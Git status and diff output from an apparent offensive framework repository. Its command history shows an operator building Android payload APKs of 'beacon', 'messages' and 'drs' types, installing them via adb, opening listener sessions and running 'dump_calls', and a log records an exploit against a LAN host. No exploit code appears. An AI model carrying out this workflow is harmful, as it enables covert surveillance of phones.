@@ -1,0 +1,2048 @@
+Output: On branch main
+Your branch is up to date with 'origin/main'.
+
+Changes to be committed:
+  (use "git restore --staged <file>..." to unstage)
+        renamed:    templates/payload/android_main_template.py -> templates/payload/android_beacon_template.py
+
+Changes not staged for commit:
+  (use "git add/rm <file>..." to update what will be committed)
+  (use "git restore <file>..." to discard changes in working directory)
+        modified:   .data/.config/Aliases.json
+        modified:   .data/.config/data.db
+        modified:   .data/.errors/error.log
+        modified:   .data/.history/history
+        modified:   .data/.logs/activity.log
+        modified:   .idea/.SuperSploit.iml
+        modified:   docs/development/CHANGELOG.md
+        modified:   docs/development/TODO.md
+        modified:   exploits/Windows/Eternalblue.py
+        modified:   exploits/linux/cve_2022_0847_dirtypipe.py
+        modified:   exploits/test/CWE78_RCE.py
+        modified:   payloads/Stage2/beacon.py
+        modified:   setup/setup.py
+        deleted:    source/core/__pycache__/ToStdOut.cpython-311.pyc
+        deleted:    source/core/__pycache__/__init__.cpython-311.pyc
+        deleted:    source/core/__pycache__/banners.cpython-311.pyc
+        deleted:    source/core/__pycache__/clean.cpython-311.pyc
+        deleted:    source/core/__pycache__/database.cpython-311.pyc
+        deleted:    source/core/__pycache__/encrypter.cpython-311.pyc
+        deleted:    source/core/__pycache__/errors.cpython-311.pyc
+        deleted:    source/core/__pycache__/exploithandler.cpython-311.pyc
+        deleted:    source/core/__pycache__/help.cpython-311.pyc
+        deleted:    source/core/__pycache__/inputHandler.cpython-311.pyc
+        deleted:    source/core/__pycache__/inputfixes.cpython-311.pyc
+        deleted:    source/core/__pycache__/logger.cpython-311.pyc
+        deleted:    source/core/__pycache__/search.cpython-311.pyc
+        deleted:    source/core/__pycache__/security.cpython-311.pyc
+        deleted:    source/core/__pycache__/set.cpython-311.pyc
+        deleted:    source/core/__pycache__/show.cpython-311.pyc
+        deleted:    source/core/__pycache__/use.cpython-311.pyc
+        modified:   source/core/android_kivy_generator.py
+        modified:   source/core/input_handling_engine.py
+        modified:   source/core/listener.py
+        modified:   source/tools/android_payload_generator.py
+        modified:   templates/payload/android_drs_template.py
+
+Untracked files:
+  (use "git add <file>..." to include in what will be committed)
+        .DS_Store
+        .data/.assets/._Logo-v2.png
+        .data/.config/._nmap-service-probes.txt
+        .data/.help/._modules
+        .data/.logs/recon_activity.log
+        .data/kivy_build/
+        .data/test/._remote_command_execution_test.py
+        .data/test/ssl_repro.py
+        .data_bak/.assets/._Logo-v2.png
+        .data_bak/.config/._nmap-service-probes.txt
+        .data_bak/.help/._modules
+        .data_bak/test/._remote_command_execution_test.py
+        docs/research/cve_2026_0047_breakdown.md
+        exploits/.DS_Store
+        exploits/Windows/cve_2021_34527_printnightmare.py
+        exploits/Windows/cve_2023_28252_clfs.py
+        exploits/android/
+        exploits/apple/
+        exploits/hardware/
+        exploits/linux/cve_2021_4034_pwnkit.c
+        exploits/linux/cve_2023_4911_looney_tunables.c
+        exploits/linux/cve_2024_1086_nftables.c
+        exploits/network/
+        exploits/test/Deserialization_Challenge.py
+        exploits/test/SQLi_Challenge.py
+        exploits/web/
+        payloads/.DS_Store
+        payloads/android/
+        payloads/payload.apk
+        recon/native-discovery/__pycache__/
+        recon/native-discovery/lateral_discovery.py
+        recon/native-discovery/multi_layered_discovery.py
+        source/.DS_Store
+        source/__pycache__/
+        source/core/__pycache__/ToStdOut.cpython-313.pyc
+        source/core/__pycache__/__init__.cpython-313.pyc
+        source/core/__pycache__/android_kivy_generator.cpython-313.pyc
+        source/core/__pycache__/auto_suggest.cpython-313.pyc
+        source/core/__pycache__/banners.cpython-313.pyc
+        source/core/__pycache__/clean.cpython-313.pyc
+        source/core/__pycache__/database.cpython-313.pyc
+        source/core/__pycache__/encrypter.cpython-313.pyc
+        source/core/__pycache__/errors.cpython-313.pyc
+        source/core/__pycache__/exploit_engine.cpython-313.pyc
+        source/core/__pycache__/help.cpython-313.pyc
+        source/core/__pycache__/input_handling_engine.cpython-313.pyc
+        source/core/__pycache__/inputfixes.cpython-313.pyc
+        source/core/__pycache__/listener.cpython-313.pyc
+        source/core/__pycache__/logger.cpython-313.pyc
+        source/core/__pycache__/migrate_nmap_db.cpython-313.pyc
+        source/core/__pycache__/migrate_services.cpython-313.pyc
+        source/core/__pycache__/recon_engine.cpython-313.pyc
+        source/core/__pycache__/search.cpython-313.pyc
+        source/core/__pycache__/service_db_manager.cpython-313.pyc
+        source/core/__pycache__/session_loader.cpython-313.pyc
+        source/core/__pycache__/sessions.cpython-313.pyc
+        source/core/__pycache__/set.cpython-313.pyc
+        source/core/__pycache__/show.cpython-313.pyc
+        source/core/__pycache__/stager_generator.cpython-313.pyc
+        source/core/__pycache__/use.cpython-313.pyc
+        source/tools/.DS_Store
+        templates/payload/android_messages_template.py
+        tests/test_lateral_discovery.py
+
+diff --git a/.data/.config/Aliases.json b/.data/.config/Aliases.json
+index 0075e1c..0fe59cd 100755
+--- a/.data/.config/Aliases.json
++++ b/.data/.config/Aliases.json
+@@ -1,18 +1,19 @@
+ {
+-    "ss": "/Users/donald/.SuperSploit",
+-    "~": "/Users/donald",
+-    "config": "/Users/donald/.SuperSploit/.data/.config",
+-    "db": "/Users/donald/.SuperSploit/.data/.config/data.json",
+-    "history": "/Users/donald/.SuperSploit/.data/.history/history",
+-    "install_dir": "/Users/donald/.SuperSploit",
+-    "logs": "/Users/donald/.SuperSploit/.data/.logs",
+-    "nmapDb": "/Users/donald/.SuperSploit/.data/.config/nmap-os-db.txt",
+-    "aliases": "/Users/donald/.SuperSploit/.data/.config/aliases.json",
+-    "exploits": "/Users/donald/.SuperSploit/exploits",
+-    "recon": "/Users/donald/.SuperSploit/recon",
+-    "assets": "/Users/donald/.SuperSploit/.data/.config/.assets/",
+-    "activity": "/Users/donald/.SuperSploit/.data/.logs/activity.log",
+-    "targets": "/Users/donald/.SuperSploit/.data/.config/targets.json",
+-    "templates":"/Users/donald/.SuperSploit/templates",
+-    "payloads": "/Users/donald/.SuperSploit/payloads"
++    "activity": "/home/donald/.SuperSploit/.data/.logs/activity.log",
++    "aliases": "/home/donald/.SuperSploit/.data/.config/Aliases.json",
++    "assets": "/home/donald/.SuperSploit/.data/.config/.assets",
++    "config": "/home/donald/.SuperSploit/.data/.config",
++    "db": "/home/donald/.SuperSploit/.data/.config/data.db",
++    "exploits": "/home/donald/.SuperSploit/exploits",
++    "history": "/home/donald/.SuperSploit/.data/.history/history",
++    "install_dir": "/home/donald/.SuperSploit",
++    "logs": "/home/donald/.SuperSploit/.data/.logs",
++    "nmapDb": "/home/donald/.SuperSploit/.data/.config/nmap-os-db.txt",
++    "payloads": "/home/donald/.SuperSploit/payloads",
++    "recon": "/home/donald/.SuperSploit/recon",
++    "reports": "/home/donald/.SuperSploit/.data/.loot/reports",
++    "ss": "/home/donald/.SuperSploit",
++    "targets": "/home/donald/.SuperSploit/.data/.config/targets.json",
++    "templates": "/home/donald/.SuperSploit/templates",
++    "~": "/home/donald"
+ }
+\ No newline at end of file
+diff --git a/.data/.config/data.db b/.data/.config/data.db
+index ae6bd90..81e31d1 100644
+Binary files a/.data/.config/data.db and b/.data/.config/data.db differ
+diff --git a/.data/.errors/error.log b/.data/.errors/error.log
+index fdf1fce..dfc7f37 100755
+--- a/.data/.errors/error.log
++++ b/.data/.errors/error.log
+@@ -1,21 +1,6 @@
+-[!] Program not found: adb
+-Traceback (most recent call last):
+-  File "/home/donald/.SuperSploit/source/core/input_handling_engine.py", line 172, in check
+-    general_cmds[cmd_name](data)
+-    ~~~~~~~~~~~~~~~~~~~~~~^^^^^^
+-  File "/home/donald/.SuperSploit/source/core/recon_engine.py", line 40, in __init__
+-    self.module = False if input("[*] Run as a module in python [y/n]: ").lower().startswith("n") else True
+-                           ~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+-EOFError: EOF when reading a line
+-Traceback (most recent call last):
+-  File "/home/donald/.SuperSploit/source/core/input_handling_engine.py", line 172, in check
+-    general_cmds[cmd_name](data)
+-    ~~~~~~~~~~~~~~~~~~~~~~^^^^^^
+-  File "/home/donald/.SuperSploit/source/core/recon_engine.py", line 40, in __init__
+-    self.module = False if input("[*] Run as a module in python [y/n]: ").lower().startswith("n") else True
+-                           ~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+-EOFError: EOF when reading a line
+-[!] Program not found: y
+-[!] Program not found: n
+-[!] Program not found: ifconfig
+-[!] Program not found: shearch
++[!] Program not found: se
++[!] Program not found: dump_calls
++[!] Program not found: #
++[!] Program not found: genearte-apk
++[!] Program not found: sysinfo
++[!] Program not found: sysinfo
+diff --git a/.data/.history/history b/.data/.history/history
+index 6eee23c..a55ec17 100755
+--- a/.data/.history/history
++++ b/.data/.history/history
+@@ -1,627 +1,270 @@
+ 
+-# 2026-05-26 23:09:10.570439
++# 2026-05-27 16:55:21.947226
+ +clear
+ 
+-# 2026-05-26 23:09:13.098430
++# 2026-05-27 16:55:23.380167
+ +show
+ 
+-# 2026-05-26 23:09:24.066870
+-+search recon
+-
+-# 2026-05-26 23:09:33.899186
+-+set target 192.168.222.225
+-
+-# 2026-05-26 23:09:54.788527
+-+use recon 0
++# 2026-05-27 16:55:33.863682
+++generate-apk
+ 
+-# 2026-05-26 23:09:57.028001
+-+run
++# 2026-05-27 16:56:05.448680
+++set ANDROID_PAYLOAD_TYPE beacon
+ 
+-# 2026-05-26 23:10:36.197211
+-+search exploits 2026
++# 2026-05-27 16:56:11.624285
+++set ANDROID_PAYLOAD_TYPE messages
+ 
+-# 2026-05-26 23:10:44.165579
+-+use exploit 13
++# 2026-05-27 16:56:21.665104
+++set ANDROID_PAYLOAD_TYPE drs
+ 
+-# 2026-05-26 23:10:47.869897
+-+exploit
++# 2026-05-27 16:56:38.554637
+++set host 192.168.151.158
+ 
+-# 2026-05-26 23:11:08.134460
+-+adb shell
++# 2026-05-27 16:56:50.729865
+++set l_port 5000
+ 
+-# 2026-05-26 23:11:27.455804
+-+sudo apt-get install adb
++# 2026-05-27 16:57:01.353475
+++ls
+ 
+-# 2026-05-26 23:11:52.808289
+-+adb shell
++# 2026-05-27 16:57:33.259283
+++show
+ 
+-# 2026-05-26 23:11:57.976604
+-+exploit
++# 2026-05-27 16:57:48.860063
+++set SHOW_ICON true
+ 
+-# 2026-05-26 23:12:11.768838
+-+sessions
+-
+-# 2026-05-26 23:12:18.320987
+-+adb devices
++# 2026-05-27 16:57:52.218969
+++show
+ 
+-# 2026-05-26 23:12:32.585995
+-+gemini
++# 2026-05-27 16:58:21.324857
+++generate-apk
+ 
+-# 2026-05-26 23:14:16.797145
++# 2026-05-27 16:59:05.880661
+ +clear
+ 
+-# 2026-05-26 23:15:10.296540
+-+exploit
+-
+-# 2026-05-26 23:15:28.357271
+-+adb shell
+-
+-# 2026-05-26 23:15:40.950120
+-+adb devices
+-
+-# 2026-05-26 23:15:44.033217
+-+sessions
+-
+-# 2026-05-26 23:15:48.768088
+-+exit
+-
+-# 2026-05-26 23:17:13.893788
+-+adb connect 192.168.222.225:5555
+-
+-# 2026-05-26 23:17:19.765598
+-+exploit
+-
+-# 2026-05-26 23:17:54.862966
+-+adb connect 192.168.222.225:5555
+-
+-# 2026-05-26 23:17:59.662927
+-+adb shell
++# 2026-05-27 16:59:11.976708
+++ls payloads
+ 
+-# 2026-05-26 23:18:04.767375
+-+adb devices
++# 2026-05-27 16:59:39.416934
+++rm payloads FlappyBirds
+ 
+-# 2026-05-26 23:19:47.587562
+-+exploit
++# 2026-05-27 16:59:50.086173
+++rm payloads/FlappyBirds
+ 
+-# 2026-05-26 23:19:58.459563
+-+clear
++# 2026-05-27 16:59:51.858834
+++ls
+ 
+-# 2026-05-26 23:21:30.959865
++# 2026-05-27 17:00:06.440334
+ +ls payloads
+ 
+-# 2026-05-26 23:21:34.280057
+-+ls payload
+-
+-# 2026-05-26 23:32:32.047274
+-+search samsung
+-
+-# 2026-05-26 23:32:33.100003
+-+use exploits/android/samsung_at_fuzzer.py
+-
+-# 2026-05-26 23:32:33.127032
+-+run
++# 2026-05-27 17:00:22.634212
+++adb install payloads/payload.apk
+ 
+-# 2026-05-26 23:32:33.159988
+-+exit
++# 2026-05-27 17:00:31.336144
+++set LISTENER true
+ 
+-# 2026-05-26 23:32:52.169512
+-+search exploits samsung
++# 2026-05-27 17:01:31.699068
+++sessions -i 2
+ 
+-# 2026-05-26 23:32:53.194903
+-+exit
++# 2026-05-27 17:01:34.319779
+++sessions -i 1
+ 
+-# 2026-05-26 23:33:06.516880
+-+use exploit 18
++# 2026-05-27 17:02:58.564371
+++sessions -i 2
+ 
+-# 2026-05-26 23:33:07.555436
+-+run
++# 2026-05-27 17:03:29.734893
+++clear
+ 
+-# 2026-05-26 23:33:07.575143
+-+y
++# 2026-05-27 17:03:49.271527
+++sessions -i 3
+ 
+-# 2026-05-26 23:33:07.596161
+-+n
++# 2026-05-27 17:04:49.817113
+++sessions -i 4
+ 
+-# 2026-05-26 23:33:07.640277
++# 2026-05-27 17:04:55.532207
+ +exit
+ 
+-# 2026-05-26 23:50:10.800589
+-+search exploits
+-
+-# 2026-05-26 23:50:29.688904
+-+search exploits loadable
+-
+-# 2026-05-26 23:50:38.749384
+-+search loadable
+-
+-# 2026-05-26 23:50:44.761200
+-+clear
+-
+-# 2026-05-26 23:50:55.193662
+-+search payloads
++# 2026-05-27 17:05:11.626923
+++set ANDROID_PAYLOAD_TYPE messages
+ 
+-# 2026-05-26 23:51:13.146100
+-+set LISTENER true
++# 2026-05-27 17:05:14.798175
+++generate-apk
+ 
+-# 2026-05-26 23:51:20.578243
+-+adb devices
++# 2026-05-27 17:06:13.390307
+++adb install payloads/payload.apk
+ 
+-# 2026-05-26 23:51:45.500618
++# 2026-05-27 17:06:32.413357
+ +set LISTENER true
+ 
+-# 2026-05-26 23:51:52.419220
+-+clear
+-
+-# 2026-05-26 23:51:57.556352
+-+show
+-
+-# 2026-05-26 23:52:06.436872
+-+set suggest true
+-
+-# 2026-05-26 23:52:25.212484
+-+search payloads android
+-
+-# 2026-05-26 23:52:29.172415
+-+search payloads
+-
+-# 2026-05-26 23:52:43.365545
+-+use payload 4
+-
+-# 2026-05-26 23:53:15.214418
+-+adb disconnect
+-
+-# 2026-05-26 23:53:22.846358
+-+adb devices
+-
+-# 2026-05-26 23:54:20.799981
+-+adb install payloads/android/android_payload.apk
++# 2026-05-27 17:06:42.018886
+++se
+ 
+-# 2026-05-26 23:54:30.808150
+-+ls
+-
+-# 2026-05-26 23:54:33.256278
+-+cd ss
+-
+-# 2026-05-26 23:54:47.448545
+-+nano aliases
++# 2026-05-27 17:06:47.380511
+++sessions -i 1
+ 
+-# 2026-05-26 23:55:07.513321
+-+cd .SuperSploit
++# 2026-05-27 17:07:02.671949
+++sessions -i 2
+ 
+-# 2026-05-26 23:55:09.321405
++# 2026-05-27 17:13:30.206383
+ +clear
+ 
+-# 2026-05-26 23:55:09.945328
+-+ls
+-
+-# 2026-05-26 23:55:23.857351
+-+adb install payloads/android/android_payload.apk
+-
+-# 2026-05-26 23:57:46.862575
+-+gemini
+-
+-# 2026-05-26 23:59:47.610008
+-+clear
++# 2026-05-27 17:13:36.140903
+++show
+ 
+-# 2026-05-26 23:59:52.201970
+-+exit
++# 2026-05-27 17:13:46.200637
+++set ANDROID_PAYLOAD_TYPE drs
+ 
+-# 2026-05-27 00:02:24.933740
++# 2026-05-27 17:14:18.957442
+ +set LISTENER true
+ 
+-# 2026-05-27 00:02:37.911639
+-+adb install payloads/android/android_payload.apk
++# 2026-05-27 17:14:31.036816
+++adb install payloads/payload.apk
+ 
+-# 2026-05-27 00:04:50.076025
++# 2026-05-27 17:15:18.076254
+ +show
+ 
+-# 2026-05-27 00:05:05.269074
+-+search payloads
+-
+-# 2026-05-27 00:05:14.805523
+-+use stage2 4
+-
+-# 2026-05-27 00:05:18.053325
+-+clear
+-
+-# 2026-05-27 00:05:21.501760
+-+search payloads
+-
+-# 2026-05-27 00:09:56.462948
+-+clear
+-
+-# 2026-05-27 00:10:21.000443
++# 2026-05-27 17:15:36.624128
+ +generate-apk
+ 
+-# 2026-05-27 00:10:25.375223
+-+show
+-
+-# 2026-05-27 00:10:39.048502
+-+set host 192.168.222.158
+-
+-# 2026-05-27 00:10:47.832833
+-+set l_port 5000
+-
+-# 2026-05-27 00:10:54.015691
+-+generate-apk
++# 2026-05-27 17:16:25.303134
+++adb install payloads/payload.apk
+ 
+-# 2026-05-27 00:11:48.841444
+-+adb install payloads/android/android_payload.apk
++# 2026-05-27 17:16:43.348159
+++set LISTENER true
+ 
+-# 2026-05-27 00:11:56.747136
+-+ls
++# 2026-05-27 17:17:39.466756
+++sessions -i 4
+ 
+-# 2026-05-27 00:12:02.169145
+-+cd .SuperSploit
++# 2026-05-27 17:19:06.552277
+++dump_calls
+ 
+-# 2026-05-27 00:12:08.915502
+-+adb install payloads/android/android_payload.apk
++# 2026-05-27 17:19:10.320199
+++sessions -i 5
+ 
+-# 2026-05-27 00:12:16.192285
++# 2026-05-27 17:22:56.943119
+ +set LISTENER true
+ 
+-# 2026-05-27 00:20:02.365526
+-+show
++# 2026-05-27 17:23:24.354519
+++sessions -i 1
+ 
+-# 2026-05-27 00:20:07.633213
+-+set LISTENER true
++# 2026-05-27 17:25:03.705663
+++exit
+ 
+-# 2026-05-27 00:20:36.467913
+-+set host 192.168.222.158
++# 2026-05-27 17:25:26.798474
+++set ANDROID_PAYLOAD_TYPE beacon
+ 
+-# 2026-05-27 00:20:39.499694
+-+generate-apk
++# 2026-05-27 17:25:30.759143
+++set ANDROID_PAYLOAD_TYPE messages
+ 
+-# 2026-05-27 00:21:36.095263
+-+adb install payloads/android/android_payload.apk
++# 2026-05-27 17:25:34.234103
+++generate-apk
+ 
+-# 2026-05-27 00:22:06.287253
+-+set l_port 5000
++# 2026-05-27 17:26:36.406880
+++adb install payloads/payload.apk
+ 
+-# 2026-05-27 00:22:20.189939
++# 2026-05-27 17:26:44.506381
+ +set LISTENER true
+ 
+-# 2026-05-27 00:22:55.802977
+-+exit
+-
+-# 2026-05-27 00:23:27.862966
+-+search exploits
+-
+-# 2026-05-27 00:23:44.952339
++# 2026-05-27 17:30:28.138182
+ +clear
+ 
+-# 2026-05-27 00:23:51.616361
+-+adb install payloads/android/android_payload.apk
+-
+-# 2026-05-27 00:23:59.683124
+-+show
+-
+-# 2026-05-27 00:24:11.360989
++# 2026-05-27 17:30:32.569909
+ +generate-apk
+ 
+-# 2026-05-27 00:25:58.940065
+-+set LPORT 5000
++# 2026-05-27 17:31:53.509286
+++adb install payloads/payload.apk
+ 
+-# 2026-05-27 00:26:10.876878
+-+set LHOST 192.168.222.158
++# 2026-05-27 17:32:04.244829
+++set LISTENER true
+ 
+-# 2026-05-27 00:26:14.005784
++# 2026-05-27 17:32:46.817122
+ +generate-apk
+ 
+-# 2026-05-27 00:29:12.488868
+-+adb install payloads/android/android_payload.apk
++# 2026-05-27 17:36:31.864700
+++adb install payloads/payload.apk
+ 
+-# 2026-05-27 00:29:23.344732
++# 2026-05-27 17:36:38.729588
+ +set LISTENER true
+ 
+-# 2026-05-27 00:29:41.222419
++# 2026-05-27 17:40:59.055478
+ +sessions
+ 
+-# 2026-05-27 00:30:33.943823
+-+show
+-
+-# 2026-05-27 00:30:50.676914
+-+set LISTENER true
+-
+-# 2026-05-27 00:32:26.471554
+-+clear
+-
+-# 2026-05-27 00:32:35.830217
+-+adb install payloads/android/android_payload.apk
+-
+-# 2026-05-27 00:32:48.253295
+-+sessions
++# 2026-05-27 17:41:00.083413
+++show options
+ 
+-# 2026-05-27 00:32:53.484486
+-+sessions -i 5
+-
+-# 2026-05-27 00:34:04.750819
+-+sessions -i 6
+-
+-# 2026-05-27 00:34:06.921602
+-+clear
+-
+-# 2026-05-27 00:34:08.487424
++# 2026-05-27 17:41:00.104595
+ +exit
+ 
+-# 2026-05-27 00:34:13.975620
++# 2026-05-27 17:42:52.364521
+ +set LISTENER true
+ 
+-# 2026-05-27 00:34:29.146005
+-+sessions
++# 2026-05-27 17:42:53.427351
+++# Wait for connection
+ 
+-# 2026-05-27 00:34:41.979420
+-+sessions -i 1
+-
+-# 2026-05-27 00:35:44.404130
+-+sessions -i 2
++# 2026-05-27 17:42:57.696937
+++set LISTENER true
+ 
+-# 2026-05-27 00:36:42.180534
++# 2026-05-27 17:45:12.867755
+ +sessions
+ 
+-# 2026-05-27 00:36:47.819504
+-+sessions -i 3
+-
+-# 2026-05-27 00:37:41.864860
++# 2026-05-27 17:45:13.892449
+ +exit
+ 
+-# 2026-05-27 00:43:40.349714
+-+set target 192.168.222.0/24
+-
+-# 2026-05-27 00:43:45.645659
+-+search recon
+-
+-# 2026-05-27 00:43:55.165982
+-+use recon 6
+-
+-# 2026-05-27 00:43:57.437923
+-+run
++# 2026-05-27 17:45:39.066966
+++sessions
+ 
+-# 2026-05-27 00:45:53.727627
++# 2026-05-27 17:45:40.099110
+ +exit
+ 
+-# 2026-05-27 00:49:58.546850
+-+run
+-
+-# 2026-05-27 00:50:33.927233
++# 2026-05-27 17:47:36.859183
+ +sessions
+ 
+-# 2026-05-27 00:54:25.631709
+-+run
+-
+-# 2026-05-27 00:54:44.368425
+-+ifconfig wlan0
+-
+-# 2026-05-27 00:54:50.088097
+-+sudo ifconfig
+-
+-# 2026-05-27 00:55:19.105684
+-+clear
++# 2026-05-27 17:47:37.897389
+++exit
+ 
+-# 2026-05-27 00:55:24.385746
+-+run
++# 2026-05-27 17:48:48.055525
+++genearte-apk
+ 
+-# 2026-05-27 00:56:46.155195
+-+clear
++# 2026-05-27 17:48:55.807780
+++generate-apk
+ 
+-# 2026-05-27 00:58:02.612446
+-+run
++# 2026-05-27 17:49:57.600422
+++adb install payloads/payload.apk
+ 
+-# 2026-05-27 01:13:17.093358
++# 2026-05-27 17:50:06.316538
+ +set LISTENER true
+ 
+-# 2026-05-27 01:13:56.855199
+-+show
+-
+-# 2026-05-27 01:14:03.974252
+-+sessions
+-
+-# 2026-05-27 01:17:17.335129
+-+run
+-
+-# 2026-05-27 01:18:23.968632
+-+search targets
+-
+-# 2026-05-27 01:18:33.056951
+-+suggest
+-
+-# 2026-05-27 01:18:49.233521
+-+clear
+-
+-# 2026-05-27 01:18:53.849653
+-+shearch targets
+-
+-# 2026-05-27 01:19:00.385827
+-+search targets
+-
+-# 2026-05-27 01:19:04.296033
+-+search targets 0
+-
+-# 2026-05-27 01:19:18.490414
+-+use target 0
+-
+-# 2026-05-27 01:20:08.572724
+-+search recon
+-
+-# 2026-05-27 01:20:25.165272
+-+use recon 2
+-
+-# 2026-05-27 01:20:28.996479
+-+run
+-
+-# 2026-05-27 01:20:43.861308
+-+use target 1
+-
+-# 2026-05-27 01:20:47.035031
+-+use target 0
+-
+-# 2026-05-27 01:21:12.174735
+-+set port 1434
+-
+-# 2026-05-27 01:21:17.883726
+-+run
+-
+-# 2026-05-27 01:22:03.741961
+-+use recon 0
+-
+-# 2026-05-27 01:22:06.199997
+-+run
+-
+-# 2026-05-27 01:24:34.462877
+-+search exploits 2023
+-
+-# 2026-05-27 01:24:45.020447
+-+use exploit 13
+-
+-# 2026-05-27 01:24:55.678268
+-+set target 192.168.222.225
+-
+-# 2026-05-27 01:25:02.574022
+-+exploit
+-
+-# 2026-05-27 01:25:23.039226
+-+pip install pybluez
+-
+-# 2026-05-27 01:25:37.872567
+-+pip install pybluez --break-system-packages
+-
+-# 2026-05-27 01:27:08.125644
+-+sudo apt update && sudo apt install python3-bluez
+-
+-# 2026-05-27 01:27:28.573557
+-+exploit
+-
+-# 2026-05-27 01:27:45.638083
+-+hcitool
+-
+-# 2026-05-27 01:27:57.299724
+-+hcitool -scan
+-
+-# 2026-05-27 01:28:05.601530
+-+hcitool scan
+-
+-# 2026-05-27 01:28:09.086921
+-+hcitool scan hci0
+-
+-# 2026-05-27 01:28:13.296289
+-+clear
+-
+-# 2026-05-27 01:28:23.089518
+-+hcitool scan
+-
+-# 2026-05-27 01:28:34.263704
+-+hciconfig
+-
+-# 2026-05-27 01:28:41.294890
+-+hcitool hci0 scan
+-
+-# 2026-05-27 01:28:46.168175
+-+hcitool -i hci0 scan
+-
+-# 2026-05-27 01:28:53.915647
+-+hcitool scan
+-
+-# 2026-05-27 01:28:57.704657
+-+hciconfig
+-
+-# 2026-05-27 01:29:02.594590
+-+hcitool scan hci0
+-
+-# 2026-05-27 01:29:13.780543
+-+clear
+-
+-# 2026-05-27 01:29:18.000598
+-+man hcitool
+-
+-# 2026-05-27 01:29:44.042621
+-+hcitool scan hci0
+-
+-# 2026-05-27 01:29:47.117594
+-+hcitool scan
++# 2026-05-27 17:52:04.644537
+++sessions -i 1
+ 
+-# 2026-05-27 01:30:24.604092
+-+sudo hcitool lescan
++# 2026-05-27 17:52:05.669013
+++sysinfo
+ 
+-# 2026-05-27 01:31:00.196386
+-+clear
++# 2026-05-27 17:52:05.698729
+++whoami
+ 
+-# 2026-05-27 01:33:16.134111
+-+search exploits 2026
++# 2026-05-27 17:52:05.726762
+++pwd
+ 
+-# 2026-05-27 01:33:33.635723
++# 2026-05-27 17:52:05.762238
+ +exit
+ 
+-# 2026-05-27 01:53:36.297100
+-+set OUTPUT_FILE /payloads/android/payload.apk
+-
+-# 2026-05-27 01:53:57.700744
+-+search exploits 2026
+-
+-# 2026-05-27 01:54:20.153337
+-+use exploit 9
+-
+-# 2026-05-27 01:54:27.100693
+-+show exploit
+-
+-# 2026-05-27 01:54:41.090467
+-+clear
+-
+-# 2026-05-27 01:54:53.106493
+-+search payloads
+-
+-# 2026-05-27 01:55:17.715476
+-+generate-apk
+-
+-# 2026-05-27 01:56:33.600006
++# 2026-05-27 17:52:44.804634
+ +set LISTENER true
+ 
+-# 2026-05-27 01:57:10.461651
+-+adb install payloads/android/android_payload.apk
+-
+-# 2026-05-27 01:57:30.109985
+-+sessions
+-
+-# 2026-05-27 01:57:33.189435
+-+clear
+-
+-# 2026-05-27 01:57:37.214970
+-+sessions -i 1
+-
+-# 2026-05-27 01:59:32.793104
++# 2026-05-27 18:21:28.908579
+ +sessions -i 2
+ 
+-# 2026-05-27 01:59:46.937017
+-+exit
++# 2026-05-27 18:21:29.938718
+++sysinfo
+ 
+-# 2026-05-27 02:02:57.194353
+-+generate-apk
++# 2026-05-27 18:21:29.973945
+++whoami
+ 
+-# 2026-05-27 02:04:08.250918
+-+adb install payloads/android/android_payload.apk
++# 2026-05-27 18:21:30.000636
+++pwd
+ 
+-# 2026-05-27 02:04:35.800681
++# 2026-05-27 18:21:30.024182
+ +exit
+ 
+-# 2026-05-27 02:05:27.402030
+-+help android
+-
+-# 2026-05-27 02:05:30.113913
+-+help
+-
+-# 2026-05-27 02:05:36.770031
+-+help session
+-
+-# 2026-05-27 02:05:43.443600
++# 2026-05-27 18:22:47.808811
+ +set LISTENER true
+-
+-# 2026-05-27 02:07:35.917149
+-+clear
+-
+-# 2026-05-27 02:10:38.760768
+-+help android
+-
+-# 2026-05-27 02:19:32.299719
+-+help generate-apk
+-
+-# 2026-05-27 02:20:20.763376
+-+clear
+diff --git a/.data/.logs/activity.log b/.data/.logs/activity.log
+index a1d24fd..f181300 100755
+--- a/.data/.logs/activity.log
++++ b/.data/.logs/activity.log
+@@ -1,75 +1,42 @@
+-[2026-05-26 23:10:57] [SESSION: 64ef859e] TYPE: PYTHON-MODULE | EXPLOIT: /home/donald/.SuperSploit/exploits/android/cve_2026_0073_adb_masterkey.py | TARGET: 192.168.222.225 | SUCCESS: True
+-[2026-05-26 23:12:06] [SESSION: 64ef859e] TYPE: PYTHON-MODULE | EXPLOIT: /home/donald/.SuperSploit/exploits/android/cve_2026_0073_adb_masterkey.py | TARGET: 192.168.222.225 | SUCCESS: True
+ --------------------------------------------------
+-[2026-05-26 23:15:04] [SESSION: ba1bd0b2] --- SUPERSPLOIT FRAMEWORK LAUNCHED ---
+-[2026-05-26 23:15:20] [SESSION: ba1bd0b2] TYPE: PYTHON-MODULE | EXPLOIT: /home/donald/.SuperSploit/exploits/android/cve_2026_0073_adb_masterkey.py | TARGET: 192.168.222.225 | SUCCESS: True
+-[2026-05-26 23:17:27] [SESSION: ba1bd0b2] TYPE: PYTHON-MODULE | EXPLOIT: /home/donald/.SuperSploit/exploits/android/cve_2026_0073_adb_masterkey.py | TARGET: 192.168.222.225 | SUCCESS: True
+-[2026-05-26 23:19:52] [SESSION: ba1bd0b2] TYPE: PYTHON-MODULE | EXPLOIT: /home/donald/.SuperSploit/exploits/android/cve_2026_0073_adb_masterkey.py | TARGET: 192.168.222.225 | SUCCESS: True
++[2026-05-27 17:04:59] [SESSION: bcfde1d2] --- SUPERSPLOIT FRAMEWORK LAUNCHED ---
+ --------------------------------------------------
+-[2026-05-26 23:32:31] [SESSION: 4c26f9f3] --- SUPERSPLOIT FRAMEWORK LAUNCHED ---
++[2026-05-27 17:22:46] [SESSION: a46460d4] --- SUPERSPLOIT FRAMEWORK LAUNCHED ---
+ --------------------------------------------------
+-[2026-05-26 23:32:52] [SESSION: bba0117c] --- SUPERSPLOIT FRAMEWORK LAUNCHED ---
++[2026-05-27 17:25:04] [SESSION: 29bc3f77] --- SUPERSPLOIT FRAMEWORK LAUNCHED ---
+ --------------------------------------------------
+-[2026-05-26 23:33:06] [SESSION: 2040a400] --- SUPERSPLOIT FRAMEWORK LAUNCHED ---
++[2026-05-27 17:35:29] [SESSION: 8d402af1] --- SUPERSPLOIT FRAMEWORK LAUNCHED ---
+ --------------------------------------------------
+-[2026-05-26 23:50:02] [SESSION: e8a58539] --- SUPERSPLOIT FRAMEWORK LAUNCHED ---
++[2026-05-27 17:39:07] [SESSION: 96c8b51e] --- SUPERSPLOIT FRAMEWORK LAUNCHED ---
